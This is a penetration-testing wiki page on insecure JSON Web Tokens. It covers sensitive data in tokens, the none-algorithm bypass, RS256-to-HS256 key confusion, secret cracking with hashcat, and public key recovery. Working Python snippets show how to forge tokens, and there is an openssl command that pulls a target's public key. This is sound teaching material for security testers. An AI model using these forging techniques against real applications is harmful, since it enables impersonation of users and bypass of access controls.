# Insecure JSON Web Tokens

## Theory

Some web applications rely on JSON Web Tokens \(JWTs\) for stateless authentication and access control instead of stateful ones with traditional session cookies. Some implementations are insecure and allow attackers to bypass controls, impersonate users, or retrieve secrets.

## Practice

Testers need to find if, and where, the tokens are used. A JWT is a base64 string of at least 100 characters, made of three parts \(header, payload, signature\) separated by dot, and usually located in `Authorization` headers with the `Bearer` keyword. See the the following example.

```text
Authorization: Bearer eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]
```

Once the tokens are found, testers need to assess their implementation's security by attempting some known attacks and flaws.

### Sensitive data

JWTs are just base64 encoded data. They may contain sensitive unencrypted information.

### Signature attack - None algorithm

Testers need to decode the token, change the algorithm to `None` \(or `none`, `NONE`, `nOnE`\) in the header, remove the signature, and send the modified token. Some applications are vulnerable to this attack since some support a None algorithm for signature.

This can be done in Python.

```python
import jwt
old_token = 'eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]'
old_token_payload = jwt.decode(old_token, verify=False)
new_token = jwt.encode(old_token_payload, key='', algorithm=None)
print(new_token)
```

If the token is accepted by the web app, it means the payload can be altered.

```python
import jwt
payload = {'key1':'value1', 'key2':'value2'}
token = jwt.encode(payload, key='', algorithm=None)
print(token)
```

### Signature attack - RS256 to HS256

If the algorithm used to sign the payload is RS256, testers can try to use HS256 instead. Instead of signing the JWT payload with a private key, using HS256 will make the web app sign it with a public key that can sometimes be easily obtained.

{% hint style="info" %}
Some applications re-use their TLS certificate for JWT operations. The TLS certificate's public key used by a server can be obtained with the following command.

```bash
echo | openssl s_client -connect $TARGET:443 | openssl x509 -pubkey -noout > pubkey.pem
```
{% endhint %}

The following Python code can be used to identify if the web application is vulnerable to this attack.

```python
import jwt
old_token = 'eyJ0eXAiOiJKV1Q[...].eyJpc3MiOiJodHRwO[...].HAveF7AqeKj-4[...]'
old_token_payload = jwt.decode(old_token, verify=False)
public_key = open('pubkey.pem', 'r').read()
new_token = jwt.encode(old_token_payload, key=public_key, algorithm='HS256')
print(new_token)
```

If the token is accepted by the web app, it means the payload can be altered.

{% hint style="warning" %}
The jwt library imported in the following Python code raises an exception when attempting to use an asymmetric key or x509 certificate as an HMAC secret. Testers need to install version 0.4.3 `pip/pip3 install pyjwt==0.4.3`.
{% endhint %}

```python
import jwt
public_key = open('pubkey.pem', 'r').read()
payload = {'key1':'value1', 'key2':'value2'}
token = jwt.encode(payload, key=public_key, algorithm='HS256')
print(token)
```

### Cracking the secret

When JWT use HMAC-SHA256/384/512 algorithms to sign the payload, tester can try to find the secret used if it weak enough. [JWT cracker](https://github.com/lmammino/jwt-cracker) \(JavaScript\) and [JWT tool](https://github.com/ticarpi/jwt_tool) \(Python\) are tools that testers can use to bruteforce JWT secrets.

JWT secrets can also be cracked using hashcat \(see the [AD credential cracking](../../active-directory-domain-services/movement/credentials/cracking.md) page for more detailed info on how to use it\).

```bash
hashcat --hash-type 16500 --attack-mode 0 $JWTs_file $wordlist_file
```

### Recovering the public key

In certain scenarios, public keys can be recovered when knowing one \(for algos ES256, ES384, ES512\) or two \(for algos RS256, RS384, RS512\) tokens.

This can be achieved with the following Python script : [JWT-Key-Recover](https://github.com/FlorianPicca/JWT-Key-Recovery)

## References

{% embed url="https://www.sjoerdlangkemper.nl/2016/09/28/attacking-jwt-authentication/" caption="" %}

{% embed url="https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/" caption="" %}

{% embed url="https://blog.imaginea.com/stateless-authentication-using-jwt-2/" caption="" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token" caption="" %}

{% embed url="https://jwt.io/" caption="" %}

